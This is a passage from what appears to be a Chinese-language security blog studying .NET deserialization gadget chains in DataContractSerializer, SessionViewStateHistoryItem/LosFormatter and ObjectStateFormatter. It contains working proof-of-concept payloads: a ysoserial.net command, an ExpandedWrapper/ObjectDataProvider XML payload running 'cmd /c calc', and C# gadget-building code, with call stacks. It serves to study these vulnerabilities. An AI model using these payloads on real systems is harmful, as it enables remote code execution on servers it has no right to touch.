DataContractSerializer(typeof(Person))</code>指定序列化对象类型Type，然后调用ReadObject()和WriteObject()进行序列化反序列化。</p><p>同样  如果我们要传入<code>ObjectDataProvider</code>生成的那个xml的poc的话  我们的type也必须是<code>ObjectDataProvider</code>(其实是ExpandedWrapper  这里说ObjectDataProvider是为了好理解一点  )</p><p>至于为啥是ExpandedWrapper的话建议去看02那一篇文章</p><h2 id="ObjectDataProvider-攻击链"><a href="#ObjectDataProvider-攻击链" class="headerlink" title="ObjectDataProvider (攻击链)"></a>ObjectDataProvider (攻击链)</h2><p>yso生成的poc</p><p><code>ysoserial.exe -f DataContractSerializer -g ObjectDataProvider -c &quot;calc&quot;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">type</span>=<span class="string">&quot;System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.datacontract.org/2004/07/System.Data.Services.Internal&quot;</span></span></span><br><span class="line"><span class="tag">                                                         <span class="attr">xmlns:c</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">                                                         <span class="attr">xmlns:i</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">                                                         <span class="attr">xmlns:z</span>=<span class="string">&quot;http://schemas.microsoft.com/2003/10/Serialization/&quot;</span></span></span><br><span class="line"><span class="tag">                                                         &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExpandedElement</span> <span class="attr">z:Id</span>=<span class="string">&quot;ref1&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">__identity</span> <span class="attr">i:nil</span>=<span class="string">&quot;true&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.datacontract.org/2004/07/System&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ExpandedElement</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ProjectedProperty0</span> <span class="attr">xmlns:a</span>=<span class="string">&quot;http://schemas.datacontract.org/2004/07/System.Windows.Data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a:MethodName</span>&gt;</span>Start<span class="tag">&lt;/<span class="name">a:MethodName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a:MethodParameters</span> <span class="attr">xmlns:b</span>=<span class="string">&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">b:anyType</span> <span class="attr">i:type</span>=<span class="string">&quot;c:string&quot;</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">b:anyType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">b:anyType</span> <span class="attr">i:type</span>=<span class="string">&quot;c:string&quot;</span>&gt;</span>/c calc<span class="tag">&lt;/<span class="name">b:anyType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a:MethodParameters</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a:ObjectInstance</span> <span class="attr">z:Ref</span>=<span class="string">&quot;ref1&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ProjectedProperty0</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            ReadObject(<span class="string">&quot;D:\\Rider\\Project\\ConsoleApplication2\\ConsoleApplication2\\DataContractSerializerExample.xml&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ReadObject</span>(<span class="params"><span class="built_in">string</span> fileName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> xml = File.ReadAllText(fileName);</span><br><span class="line">            XmlDocument xmlDocument = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">            xmlDocument.LoadXml(xml);</span><br><span class="line">            XmlNode rootNode = xmlDocument.SelectSingleNode(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">            <span class="comment">//Console.WriteLine(rootNode.InnerXml);</span></span><br><span class="line">            XmlNode typeNode = rootNode.Attributes.GetNamedItem(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">            Console.WriteLine(Type.GetType(typeNode.InnerText));</span><br><span class="line">            DataContractSerializer dataContractSerializer = <span class="keyword">new</span> DataContractSerializer(Type.GetType(typeNode.InnerText));</span><br><span class="line">            dataContractSerializer.ReadObject(<span class="keyword">new</span> XmlTextReader(<span class="keyword">new</span> StringReader(rootNode.InnerXml)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话type直接就是从xml中获取的</p><p><img src="../images/image-20240312111312986.png" alt="image-20240312111312986"></p><p>调用栈</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Process.Start()</span><br><span class="line">[<span class="meta">Native to Managed Transition</span>]</span><br><span class="line">RuntimeMethodInfo.UnsafeInvokeInternal()</span><br><span class="line">RuntimeMethodInfo.Invoke()</span><br><span class="line">RuntimeType.InvokeMember()</span><br><span class="line">ObjectDataProvider.InvokeMethodOnInstance()</span><br><span class="line">ObjectDataProvider.QueryWorker()</span><br><span class="line">ObjectDataProvider.BeginQuery()</span><br><span class="line">ObjectDataProvider.set_ObjectInstance()</span><br><span class="line">[<span class="meta">Lightweight Method Call</span>]</span><br><span class="line">ClassDataContract.ReadXmlValue()</span><br><span class="line">XmlObjectSerializerReadContext.ReadDataContractValue()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">[<span class="meta">Lightweight Method Call</span>]</span><br><span class="line">ClassDataContract.ReadXmlValue()</span><br><span class="line">XmlObjectSerializerReadContext.ReadDataContractValue()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">DataContractSerializer.InternalReadObject()</span><br><span class="line">XmlObjectSerializer.ReadObjectHandleExceptions()</span><br><span class="line">DataContractSerializer.ReadObject()</span><br><span class="line">Program.ReadObject()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><h2 id="SessionViewStateHistoryItem-攻击链"><a href="#SessionViewStateHistoryItem-攻击链" class="headerlink" title="SessionViewStateHistoryItem(攻击链)"></a>SessionViewStateHistoryItem(攻击链)</h2><p><strong>(这个类是SessionViewState的内部类  我们得查SessionViewStateHistoryItem才能进入到SessionViewState类中  直接查SessionViewState是进不去的  因为这个类是internal类型  还有就是原生的dll也是没这个类的  我们得重新下载这个dll 然后再导入进去)</strong></p><p>这就是我踩的坑  所以记录一下这个过程</p><p>这个新链子  我们直接去yso看起构造方法</p><p><img src="../images/image-20240312111654111.png" alt="image-20240312111654111"></p><p>直接去看SetType函数获取的是哪个类</p><p><img src="../images/image-20240312111857605.png" alt="image-20240312111857605"></p><p>获取的刚好是我们这个需要构造的攻击链   如何接着往下看  看看其为什么要给这个类里的s参数赋值</p><p><img src="../images/image-20240312143439867.png" alt="image-20240312143439867"></p><p>在<code>SessionViewStateHistoryItem</code>这个类进行反序列化的时候  会调用这个s参数  然后进行LosFormatter的反序列化操作  这就是为什么要传s参数的原因</p><p>完整Poc</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [Serializable]</span></span><br><span class="line">    <span class="comment">// public class SessionViewStateHistoryItemMarshal : ISerializable</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     public SessionViewStateHistoryItemMarshal(string strB64LosFormatterPayload)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         B64LosFormatterPayload = strB64LosFormatterPayload;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//     private string B64LosFormatterPayload &#123; get; &#125;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//     public void GetObjectData(SerializationInfo info, StreamingContext context)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         Type myType_SessionViewState = Type.GetType(&quot;System.Web.UI.MobileControls.SessionViewState, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;);</span></span><br><span class="line">    <span class="comment">//         Type[] nestedTypes = myType_SessionViewState.GetNestedTypes(BindingFlags.NonPublic | BindingFlags.Instance);</span></span><br><span class="line">    <span class="comment">//         info.SetType(nestedTypes[0]); // to reach the SessionViewStateHistoryItem class (private)</span></span><br><span class="line">    <span class="comment">//         info.AddValue(&quot;s&quot;, B64LosFormatterPayload);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// [Serializable]</span></span><br><span class="line">    <span class="comment">// public class TextFormattingRunPropertiesMarshal : ISerializable</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     string _xaml;</span></span><br><span class="line">    <span class="comment">//     public void GetObjectData(SerializationInfo info, StreamingContext context)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         Type typeTFRP = typeof(TextFormattingRunProperties);</span></span><br><span class="line">    <span class="comment">//         info.SetType(typeTFRP);</span></span><br><span class="line">    <span class="comment">//         info.AddValue(&quot;ForegroundBrush&quot;, _xaml);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     public TextFormattingRunPropertiesMarshal(string cmd)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         // ObjectDataProvider</span></span><br><span class="line">    <span class="comment">//         ProcessStartInfo psi = new ProcessStartInfo();</span></span><br><span class="line">    <span class="comment">//         psi.FileName = &quot;cmd.exe&quot;;</span></span><br><span class="line">    <span class="comment">//         psi.Arguments = $&quot;/c &#123;cmd&#125;&quot;;</span></span><br><span class="line">    <span class="comment">//         StringDictionary dict = new StringDictionary();</span></span><br><span class="line">    <span class="comment">//         psi.GetType().GetField(&quot;environmentVariables&quot;, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span></span><br><span class="line">    <span class="comment">//         Process p = new Process();</span></span><br><span class="line">    <span class="comment">//         p.StartInfo = psi;</span></span><br><span class="line">    <span class="comment">//         ObjectDataProvider odp = new ObjectDataProvider();</span></span><br><span class="line">    <span class="comment">//         odp.MethodName = &quot;Start&quot;;</span></span><br><span class="line">    <span class="comment">//         odp.IsInitialLoadEnabled = false;</span></span><br><span class="line">    <span class="comment">//         odp.ObjectInstance = p;</span></span><br><span class="line">    <span class="comment">//         _xaml = XamlWriter.Save(odp);   </span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//WriteObject(&quot;a.xml&quot;);</span></span><br><span class="line">            ReadObject(<span class="string">&quot;D:\\Rider\\Project\\ConsoleApplication2\\ConsoleApplication2\\DataContractSerializerExample.xml&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//         public static void WriteObject(string fileName)</span></span><br><span class="line"><span class="comment">//         &#123;</span></span><br><span class="line"><span class="comment">//             string losFormatterPayload;</span></span><br><span class="line"><span class="comment">//             using (MemoryStream memory = new MemoryStream())</span></span><br><span class="line"><span class="comment">//             &#123;</span></span><br><span class="line"><span class="comment">//                 LosFormatter losFormatter = new LosFormatter();</span></span><br><span class="line"><span class="comment">//                 //losFormatter.Serialize(memory, new TextFormattingRunPropertiesMarshal(&quot;calc&quot;));</span></span><br><span class="line"><span class="comment">//                 losFormatterPayload = Encoding.UTF8.GetString(memory.ToArray());</span></span><br><span class="line"><span class="comment">//             &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// //             string payload = $@&quot;&lt;root type=&quot;&quot;System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&quot;&gt;&lt;SessionViewState.SessionViewStateHistoryItem xmlns:i=&quot;&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&quot; xmlns:x=&quot;&quot;http://www.w3.org/2001/XMLSchema&quot;&quot; xmlns:z=&quot;&quot;http://schemas.microsoft.com/2003/10/Serialization/&quot;&quot; xmlns=&quot;&quot;http://schemas.datacontract.org/2004/07/System.Web.UI.MobileControls&quot;&quot;&gt;</span></span><br><span class="line"><span class="comment">// //   &lt;s i:type=&quot;&quot;x:string&quot;&quot; xmlns=&quot;&quot;&quot;&quot;&gt;&#123;losFormatterPayload&#125;&lt;/s&gt;</span></span><br><span class="line"><span class="comment">// // &lt;/SessionViewState.SessionViewStateHistoryItem&gt;&lt;/root&gt;&quot;;</span></span><br><span class="line"><span class="comment">//             // SessionViewStateHistoryItemMarshal textFormattingRunPropertiesMarshal =</span></span><br><span class="line"><span class="comment">//             //     new SessionViewStateHistoryItemMarshal(payload);</span></span><br><span class="line"><span class="comment">//             // File.WriteAllText(fileName, payload);</span></span><br><span class="line"><span class="comment">//             // Console.WriteLine(payload);</span></span><br><span class="line"><span class="comment">//         &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ReadObject</span>(<span class="params"><span class="built_in">string</span> fileName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> xml = File.ReadAllText(fileName);</span><br><span class="line">            XmlDocument xmlDocument = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">            xmlDocument.LoadXml(xml);</span><br><span class="line">            XmlNode rootNode = xmlDocument.SelectSingleNode(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">            XmlNode typeNode = rootNode.Attributes.GetNamedItem(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">            DataContractSerializer dataContractSerializer = <span class="keyword">new</span> DataContractSerializer(Type.GetType(typeNode.InnerText));</span><br><span class="line">            Console.WriteLine(Type.GetType(typeNode.InnerText));</span><br><span class="line">            dataContractSerializer.ReadObject(<span class="keyword">new</span> XmlTextReader(<span class="keyword">new</span> StringReader(rootNode.InnerXml)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用栈</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">XamlReader.Parse()at </span><br><span class="line">TextFormattingRunProperties.GetObjectFromSerializationInfo()</span><br><span class="line"><span class="keyword">new</span> TextFormattingRunProperties()</span><br><span class="line">[<span class="meta">Native to Managed Transition</span>]</span><br><span class="line">ObjectManager.CompleteISerializableObject()</span><br><span class="line">ObjectManager.FixupSpecialObject()</span><br><span class="line">ObjectManager.DoFixups()</span><br><span class="line">ObjectReader.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.DeserializeValue()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">LosFormatter.Deserialize()</span><br><span class="line"><span class="keyword">new</span> SessionViewState.SessionViewStateHistoryItem()</span><br><span class="line">[<span class="meta">Lightweight Method Call</span>]</span><br><span class="line">ClassDataContract.ReadXmlValue()</span><br><span class="line">XmlObjectSerializerReadContext.ReadDataContractValue()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">DataContractSerializer.InternalReadObject()</span><br><span class="line">XmlObjectSerializer.ReadObjectHandleExceptions()</span><br><span class="line">DataContractSerializer.ReadObject()</span><br><span class="line">Program.ReadObject()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><p>就是控制type和xml值就行了</p><p>NetDataContractSerializer和DataContractSerializer同样用于序列化和反序列化 Windows Communication Foundation (WCF) 消息中发送的数据。</p><p>两者有一个重要的区别在于：<a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.netdatacontractserializer?view=netframework-4.8">NetDataContractSerializer</a> 在序列化的 XML 中包含 CLR 类型信息；而 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.datacontractserializer?view=netframework-4.8">DataContractSerializer</a> 不包含。 因此，只有在序列化和反序列化端使用相同的 CLR 类型时，才能使用 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.netdatacontractserializer?view=netframework-4.8">NetDataContractSerializer</a>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractSerializer.md&quot;&gt;https://github.com/Y4er/dotnet-deserializati</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-07</title>
    <link href="https://ke1nys.github.io/posts/4d98bf02.html"/>
    <id>https://ke1nys.github.io/posts/4d98bf02.html</id>
    <published>2024-03-06T07:00:40.000Z</published>
    <updated>2024-03-12T14:41:01.019Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/ObjectStateFormatter.md">https://github.com/Y4er/dotnet-deserialization/blob/main/ObjectStateFormatter.md</a></p><h2 id="ObjectStateFormatter"><a href="#ObjectStateFormatter" class="headerlink" title="ObjectStateFormatter"></a>ObjectStateFormatter</h2><p>在06中就讲到的LosFormatter反序列化的时候  就会将字节流转到这个反序列化类来进行</p><p>ObjectStateFormatter和没有设置mac/keys的LosFormatter是一样的。所以在遇到ObjectStateFormatter反序列化时直接用ysoserial.net的LosFormatter生成payload即可，除非需要mac/key</p><p><strong>(06中没有用到mac/key)</strong></p><p>和LosFormatter一样  也是能接受stream和string类型的序列化</p><h2 id="RolePrincipal"><a href="#RolePrincipal" class="headerlink" title="RolePrincipal"></a>RolePrincipal</h2><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Security.Claims;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ObjectStateFormatterSerialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            TextFormattingRunPropertiesMarshal calc = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            <span class="built_in">string</span> b64payload;</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream m = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(m, calc);</span><br><span class="line">                b64payload = 